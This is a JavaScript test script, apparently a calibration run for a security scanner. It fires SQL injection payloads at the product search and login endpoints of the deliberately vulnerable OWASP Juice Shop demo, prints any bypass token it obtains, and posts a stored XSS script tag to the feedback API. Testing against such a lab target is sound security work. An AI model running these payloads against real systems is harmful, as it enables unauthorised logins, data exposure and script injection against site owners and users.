/**
 * Direct SQL Injection test against Juice Shop REST API
 * This bypasses the Angular frontend and tests the actual API
 */
const baseUrl = 'https://juice-shop.herokuapp.com';
const sqlPayloads = [
    "' OR 1=1--",
    "')) OR 1=1--",
    "' UNION SELECT * FROM Users--",
    "admin'--",
    "1' AND '1'='1",
];
const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
];
async function testSQLi() {
    console.log('🧪 Testing Juice Shop REST API for SQL Injection...\n');
    console.log('='.repeat(60) + '\n');
    // Test search endpoint
    for (const payload of sqlPayloads) {
        const encoded = encodeURIComponent(payload);
        const url = `${baseUrl}/rest/products/search?q=${encoded}`;
        console.log(`📍 Testing: ${payload}`);
        console.log(`   URL: ${url.substring(0, 80)}...`);
        try {
            const resp = await fetch(url);
            const data = await resp.json();
            if (data.data && data.data.length > 0) {
                console.log(`   ✅ Response: ${data.data.length} products`);
                // Normal search for "test" returns ~0 products
                // SQL injection ' OR 1=1 returns ALL products
                if (payload.includes('OR 1=1') && data.data.length > 20) {
                    console.log('   🔴 SQL INJECTION CONFIRMED! Query returned all products!');
                    console.log(`   📊 Expected: 0-5, Got: ${data.data.length}`);
                }
            }
            else if (data.error) {
                console.log(`   ⚠️ Error response: ${data.error}`);
                // SQL errors can also indicate injection vectors
                if (data.error.includes('SQLITE') || data.error.includes('SQL')) {
                    console.log('   🔴 SQL ERROR LEAKED! Database type exposed!');
                }
            }
            else {
                console.log('   ℹ️ Empty response');
            }
        }
        catch (err) {
            console.log(`   ❌ Error: ${err.message}`);
        }
        console.log('');
    }
}
async function testLoginSQLi() {
    console.log('\n🔐 Testing Login endpoint for SQL Injection...\n');
    console.log('='.repeat(60) + '\n');
    const loginPayloads = [
        { email: "' OR 1=1--", password: "anything" },
        { email: "admin'--", password: "anything" },
        { email: "' OR '1'='1", password: "' OR '1'='1" },
    ];
    for (const creds of loginPayloads) {
        console.log(`📍 Testing: ${creds.email}`);
        try {
            const resp = await fetch(`${baseUrl}/rest/user/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(creds),
            });
            const data = await resp.json();
            if (data.authentication) {
                console.log('   🔴 SQL INJECTION CONFIRMED! Login bypassed!');
                console.log(`   👤 Logged in as: ${data.authentication.umail || 'admin'}`);
                console.log(`   🎫 Token: ${data.authentication.token?.substring(0, 50)}...`);
            }
            else if (data.error) {
                console.log(`   ℹ️ Login failed: ${data.error}`);
            }
        }
        catch (err) {
            console.log(`   ❌ Error: ${err.message}`);
        }
        console.log('');
    }
}
async function testXSS() {
    console.log('\n🎯 Testing for Stored/Reflected XSS...\n');
    console.log('='.repeat(60) + '\n');
    // Test feedback endpoint (known XSS vector in Juice Shop)
    console.log('📍 Testing Customer Feedback endpoint...');
    try {
        const resp = await fetch(`${baseUrl}/api/Feedbacks`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                comment: '<script>alert("XSS")</script>',
                rating: 5,
            }),
        });
        const data = await resp.json();
        if (data.data && data.data.comment) {
            if (data.data.comment.includes('<script>')) {
                console.log('   🔴 STORED XSS CONFIRMED! Script tag accepted!');
                console.log(`   📝 Stored comment: ${data.data.comment}`);
            }
            else {
                console.log('   ✅ XSS filtered/encoded');
            }
        }
        else if (data.error) {
            console.log(`   ℹ️ ${data.error}`);
        }
    }
    catch (err) {
        console.log(`   ❌ Error: ${err.message}`);
    }
}
async function main() {
    console.log('\n╔════════════════════════════════════════════════════════════╗');
    console.log('║       JUICE SHOP VULNERABILITY VERIFICATION TEST           ║');
    console.log('║              CyberCody Calibration v25.2                    ║');
    console.log('╚════════════════════════════════════════════════════════════╝\n');
    await testSQLi();
    await testLoginSQLi();
    await testXSS();
    console.log('\n✅ Calibration test complete!\n');
}
main().catch(console.error);
